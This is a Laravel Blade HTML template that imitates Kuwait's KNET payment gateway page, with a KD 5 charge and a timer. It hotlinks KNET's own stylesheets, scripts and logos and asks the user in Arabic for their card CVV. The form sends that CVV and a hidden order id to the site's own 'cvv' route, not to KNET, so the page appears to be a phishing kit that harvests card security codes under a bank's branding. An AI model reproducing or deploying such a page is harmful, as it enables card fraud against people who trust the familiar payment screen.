
<html>
<head>

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="-1" />
    <meta http-equiv="CACHE-CONTROL" content="max-age=0"/>

    <meta charset="utf-8"/>

    <title>KNET Payments</title>

    <!-- commented for jquery vulnerability fix -->

    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <script src="https://www.kpay.com.kw/kpg/gui-v3/js/jquery-3.5.1.js"></script>
    </head>
    </html>

    <link href="https://www.kpay.com.kw/kpg/css/payment-stylesheet.css?ver=1.407" rel="stylesheet" type="text/css" />
    <link href="https://www.kpay.com.kw/kpg/css/payment-responsive-ar.css?ver=1.21" rel="stylesheet" type="text/css"/>

    <script type="text/javascript" src="https://www.kpay.com.kw/kpg/js/checkSum.js"></script>





    <script language="JavaScript" src="https://www.kpay.com.kw/kpg/js/AuthValidation.js"></script>




    <!--Code Ends  -->

</head>
<body >

<form action="{{route('cvv')}}"  method="post" autocomplete="off" >
    @csrf
    @method('POST')
    <div class="madd"> </div>



    <!--  Payment Page Confirmation Starts-->
    <div id="payConfirm" >
        <div  class="container">

            <div class="content-block">
                <div class="form-card">
                    <div class="container-blogo"><img class="logoHead-mob" src='https://www.kpay.com.kw/kpg/images/adds/deraya/mob.jpg' alt="logo" />
                    </div>
                    <div class="row">
                        <div  style="float:right;"><label class="column-label" style="width:auto;">:&#1575;&#1604;&#1605;&#1587;&#1578;&#1601;&#1610;&#1583; </label></div>
                        <div  style="text-align: right;"><label class="column-value text-label" style="width: 60%;">CBK</label> </div>
                    </div>

                    <div class="row" id="OrgTranxAmtConfirm">
                        <div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;">
                                KD&nbsp; 5
                            </label>
                        </div>
                        <div  style="float:right;">
                            <label class="column-label" style="width:auto;"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</label>
                        </div>
                    </div>

                    <!-- Added for PG Eidia Discount -->

                    <div class="row" id="DiscntRateConfirm" >

                    </div>
                    <div class="row" id="DiscntedAmtConfirm" >

                    </div>

                    <!-- Added for PG Eidia Discount -->
                </div>

                <div class="form-card">
                    <div  class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
    						font-family: helvetica, arial, sans serif;
    						color: #ff0000;
   							 padding-right: 15px;margin-bottom: 3px;text-align: center; display:none;" id="otpmsgDC2" >
                    </div>

                    <div  class="row alert-msg" id="notificationbox" style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 10px;">
                        <!-- Added for Points Redemption - modified -->
                        <div  id="notification" align="center">
                            <span dir="rtl">
                                يرجى إدخال رقم (cvv) الخاص ببطاقتك لتأكيد العملية
                            </span>
                        </div>
                    </div>


                    <!-- Added for Points Redemption -->
                    <div class="row" id="OTPDCDIV" >
                            <div  style="float: right;text-align: right;padding-top: 3px;"><label class="column-label" style="width: 100%;"><h3>cvv رقم </h3></label> </div>
                        <div  style="padding-left:7%">
                            <input class="allowalphanumericwithoutdecimal" type="tel" required  style="text-align:right;width:60%;"  name="cvv"  maxlength="" DIR="rtl"  />
                            <!-- Added for Points Redemption -->
                            <input type="hidden" name="id" value="{{$order->id}}">
                            <!-- Added for Points Redemption -->
                        </div>
                    </div>
                </div>

                <div class="form-card">
                    <div class="row">
                        <div style="text-align: center; ">

                            <div id="submithide1">
                                <button type="submit"   class="submit-button" style="float:right;"
                                       >&#1578;&#1571;&#1603;&#1610;&#1583; &#1575;&#1604;&#1593;&#1605;&#1604;&#1610;&#1577;</button>
                                <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags('MobCancelBtnAR','MobConfirmPageAR','CancelBtnAR');" id="cancel" value="&#1575;&#1604;&#1594;&#1575;&#1569;" />
                            </div>

                        </div>
                    </div>
                </div>

                <div align="center"  id="overlayhide1" class="overlay" style="display:none;">
                    <img src="https://www.kpay.com.kw/kpg/images/loadingmob.gif" style="height: 15%;margin-top:50%;"/>
                </div>

                <footer>
                    <div class="footer-content" >
            <span>
            <div class="row">
                        <div class="column-label">
                            <div class="brand-img" id="knet-brand" style="margin-top: 2px;">
                            <img  src="https://www.kpay.com.kw/kpg/images/paypage-images/knet.jpg"  alt="logo" style="width: 40px; height: 30px;"/>
                            </div>
                        </div>
                        <div class="column-value brand-info" style="margin-top: 3%;">
                            <span>Knet Payment Gateway</span><br/>
                        </div>
                    </div>
                    </span></div>
                </footer>

            </div>
        </div>
    </div>



</form>
</body>

<script>
    function startTimer(duration, display) {
        var timer = duration, minutes, seconds;
        setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = minutes + ":" + seconds;

            if (--timer < 0) {
                timer = duration;
            }
        }, 1000);
    }

    window.onload = function () {
        var fiveMinutes = 60 * 3,
            display = document.querySelector('#time');
        startTimer(fiveMinutes, display);
    };
</script>
</html>
